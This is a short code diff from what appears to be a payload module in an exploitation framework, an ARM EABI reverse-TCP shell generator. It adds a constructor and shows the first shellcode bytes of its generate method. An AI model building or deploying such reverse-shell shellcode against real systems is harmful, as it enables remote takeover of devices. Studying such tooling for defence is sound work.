@@ -22,6 +22,11 @@ class ARMEABI(Module, common.ShellCode):
     module_type = "payload"
     path = ["shell.reverse_tcp"]
     
+    def __init__(self, session, loader):
+        Module.__init__(self, session)
+        
+        self.__loader = loader
+    
     def generate(self, arguments):
         self.append([# Switch to THUMB mode for more compact shellcode
                      0x01, 0x10, 0x8f, 0xe2,     # add   r1, pc, #1
